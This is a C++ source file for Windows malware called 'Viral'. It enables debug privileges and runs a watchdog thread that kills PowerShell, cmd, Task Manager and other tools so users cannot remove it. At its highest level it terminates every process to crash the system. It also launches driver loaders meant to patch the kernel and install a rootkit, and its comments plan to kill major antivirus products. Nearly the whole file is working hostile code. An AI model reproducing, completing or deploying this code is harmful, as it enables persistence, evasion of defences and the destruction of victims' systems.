#include "global.h"

DWORD internalLastError;
ProcessManager* pProcessManager;
ThreadManager* pThreadManager;
std::vector<std::string> eventLog;

DWORD Viral::killSignal = 0x0;
BOOL Viral::killSignalReceived = FALSE;
DWORD Viral::viralStatus = level5;


int main()
{
	if (Viral::initGlobals() != SUCCESS) {
		return internalLastError;
	}

	if (Viral::initUsermode() != SUCCESS) {
		return internalLastError;
	}

	/*if (Viral::patchKernel() != SUCCESS) {
		return FAIL;
	}
	
	if (Viral::root() != SUCCESS) {
		return FAIL;
	}*/

	//if (Viral::sendKillSignal(KILL_NoAV) != SUCCESS) {
	//	return internalLastError;
	//}

	//Screen::Shot();

	CURL* curl;

	curl = curl_easy_init();
	curl_easy_cleanup(curl);

	while (pThreadManager->viralThreads.size() != 0) {
		Sleep(0200);
	}

	system("PAUSE");
}

DWORD Viral::initGlobals()
{
	internalLastError = NULL;

	pProcessManager = new ProcessManager();
	if (pProcessManager) {
		pThreadManager = new ThreadManager();
		if (pThreadManager) {
			return SUCCESS;
		}
		else {
			return (internalLastError = LOAD_FAILURE_THREAD_MANAGER);
		}
	}
	else {
		return (internalLastError = LOAD_FAILURE_PROCESS_MANAGER);
	}
}

DWORD Viral::patchKernel()
{
	const char* ldrDirectory = "ldr.exe";
	const char* ldrFull = "ldr.exe gdrv.sys DismantleOS.sys";
	pProcessManager->startSubProcess((char*)ldrDirectory, (char*)ldrFull);

	//TODO: Check for failure to patch kernel

	return SUCCESS;
}

DWORD Viral::root()
{
	const char* ldrDirectory = "ldr.exe";
	const char* ldrFull = "ldr.exe gdrv.sys root.sys";
	pProcessManager->startSubProcess((char*)ldrDirectory, (char*)ldrFull);

	//TODO: Check for failure to root system

	return SUCCESS;
}

DWORD Viral::initUsermode()
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);
	CloseHandle(hToken);

	DWORD errCode = pThreadManager->createThread((char*)"viralNoAV", &Viral::NoAV);
	if (errCode == SUCCESS) {
		errCode = pThreadManager->createThread((char*)"viralWatchdog", &Viral::Watchdog);
		if (errCode == SUCCESS) {
			return SUCCESS;
		}
		else
			return internalLastError;
	}
	else
		return internalLastError;
}

VOID Viral::NoAV()
{
	while (Viral::killSignal != KILL_NoAV) {
		//TODO: Terminate the majors by market share: ESET (12.89%), McAfee (11.9%), Symantec (10.27%), Bitdefender (10.17%), AVAST (10.09%) -- Allows
		//		infection of ~50% of the population. Yet, for now, we are not in any AV database so let's just sleep this infinite loop.

		Sleep(1000);
	}
	Viral::killSignalReceived = TRUE;
}

VOID Viral::Watchdog()
{
	while (Viral::killSignal != KILL_Watchdog) {

	#pragma region WATCHDOG_ProcessScan

		PROCESSENTRY32 entry;
		entry.dwSize = sizeof(PROCESSENTRY32);
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		if (Process32First(snapshot, &entry) == TRUE)
		{
			while (Process32Next(snapshot, &entry) == TRUE)
			{
				switch (Viral::viralStatus) {
				case level5: {
					// INFO: Viral is at DEFCON 5; we should remain invisible to the host and not utilize Watchdog at all.
				} break;
				case level4: {
					// INFO: Viral is at DEFCON 4; Watchdog will terminate powerful processes that can hurt Viral like Powershell, and CMD. It is likely
					//		 that the host will not notice this and if they do it is advised Viral be upgraded to DEFCON 3.

					if ((strcmp(entry.szExeFile, "powershell.exe") == 0) || (strcmp(entry.szExeFile, "cmd.exe") == 0))
					{
						HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
						if (TerminateProcess(hProcess, 1)) {
							auto reportProcessToD = std::chrono::system_clock::now();
							std::time_t ToD = std::chrono::system_clock::to_time_t(reportProcessToD);
							Viral::reportEvent(WATCHDOG_REPORT, std::string("Terminated " + std::string(entry.szExeFile) + " at " + std::ctime(&ToD)));
						}
						CloseHandle(hProcess);
					}
				} break;
				case level3: {
					// INFO: Viral is at DEFCON 3; Watchdog will terminate powerful processes that can hurt Viral like Powershell, CMD, Settings, Task
					//		 Manager. It is likely that the host wlil notice this behaviour. Viral should only be upgraded to DEFCON 3 as a temporary measure 
					//		 when a host is attacking Viral. Viral should downgrade to DEFCON 4 as soon as the attack is over.

					if ((strcmp(entry.szExeFile, "powershell.exe") == 0) || (strcmp(entry.szExeFile, "cmd.exe") == 0) || (strcmp(entry.szExeFile, "SystemSettings.exe") == 0) || (strcmp(entry.szExeFile, "Taskmgr.exe") == 0) || (strcmp(entry.szExeFile, "ProcessHacker.exe") == 0))
					{
						HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
						if (TerminateProcess(hProcess, 1)) {
							auto reportProcessToD = std::chrono::system_clock::now();
							std::time_t ToD = std::chrono::system_clock::to_time_t(reportProcessToD);
							Viral::reportEvent(WATCHDOG_REPORT, std::string("Terminated " + std::string(entry.szExeFile) + " at " + std::ctime(&ToD)));
						}
						CloseHandle(hProcess);
					}
				} break;
				case level2: {
					// INFO: Viral is at DEFCON 2; Watchdog will terminate most processes that can hurt Viral like Powershell, CMD, Settings, Task Manager,
					//		 Popular Browsers, Popular Debugging Utliities. The host wlil notice this behaviour. Viral should only be upgraded to DEFCON 4 as a
					//		 temporary measure assuming DEFCON 3 was not suitable. The longer Viral is at DEFCON 2, the more likely it becomes that the user will
					//		 attempt to reinstall their entire OS removing Viral completley.

					//TODO: Implement Watchdog DEFCON 2
				} break;
				case level1: {
					// INFO: Viral is at DEFCON 1; Watchdog will terminate ALL processes (even system-critical). This will force an instantaneous BugCheck. The host 
					//		 WILL notice this behaviour.

					if ((strcmp(entry.szExeFile, "viral.exe") != 0))
					{
						HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
						if (TerminateProcess(hProcess, 1)) {
							auto reportProcessToD = std::chrono::system_clock::now();
							std::time_t ToD = std::chrono::system_clock::to_time_t(reportProcessToD);
							Viral::reportEvent(WATCHDOG_REPORT, std::string("Terminated " + std::string(entry.szExeFile) + " at " + std::ctime(&ToD)));
						}
						CloseHandle(hProcess);
					}
				} break;
				}
			}
		}
		CloseHandle(snapshot);

	#pragma endregion


	}
	Viral::killSignalReceived = TRUE;
}

DWORD Viral::sendKillSignal(DWORD signal)
{
	std::string threadName;
	switch (signal) {
	case KILL_NoAV:
		threadName = "viralNoAV";
		break;
	case KILL_Watchdog:
		threadName = "viralWatchdog";
		break;
	default:
		threadName = "null";
		break;
	}

	Viral::reportEvent(VIRAL_CORE_EVENT, std::string("Requested termination of Viral Thread: " + threadName));

	Viral::killSignal = signal;

	//TODO: This suspends Viral's init thread for 1 millisecond to wait for the killSignal to be received. This is VERY SITUATIONAL, it's likely it 
	//		will be received within 1 millisecond but not in ALL cases. Also, the suspension of Viral's main thread could be crucial later in its
	//		evolution. It's better in the future to use the ThreadManager to create a new thread with the sole purpose of sending a kill signal to
	//		avoid suspending Viral's init thread.

	Sleep(0001);

	if (Viral::killSignalReceived == TRUE) {
		Viral::killSignalReceived = FALSE;
		if (pThreadManager->killThread((char*)threadName.c_str()) != SUCCESS) {
			return internalLastError;
		}
		else {
			Viral::reportEvent(VIRAL_CORE_EVENT, std::string("Terminated Viral Thread: " + threadName));
			return SUCCESS;
		}
	}
	else {
		return (internalLastError = SIGNAL_NOT_RECEIVED);
	}
}

VOID Viral::reportEvent(DWORD eventType, std::string event)
{
	std::string reportLead = "[Unknown]";

	switch (eventType) {
	case WATCHDOG_REPORT:
		reportLead = "[Viral::Watchdog]";
		break;
	case VIRAL_CORE_EVENT:
		reportLead = "[Viral::Core]";
		break;
	default:
		reportLead = "[Unknown]";
		break;
	}

	eventLog.push_back(std::string(reportLead + ": " + event));
}

VOID Viral::changeStatus(DWORD newStatus)
{
	if (Viral::viralStatus == newStatus) {
		Viral::reportEvent(VIRAL_CORE_EVENT, std::string("Viral Status change request received, but Viral is already at DEFCON " + Viral::viralStatus));
	}
	else {
		Viral::reportEvent(VIRAL_CORE_EVENT, std::string("Viral Status changed to DEFCON " + Viral::viralStatus));

		// INFO: In the rare case where Viral is upgraded to DEFCON 1, Viral will allow 5 seconds for the report log to send to the server as DEFCON 1 will destroy
		//		 any usability of the system until the OS is re-installed, not allowing Viral's messages to get out.
		if (newStatus == level1)
			Sleep(5000);

		Viral::viralStatus = newStatus;
	}
}

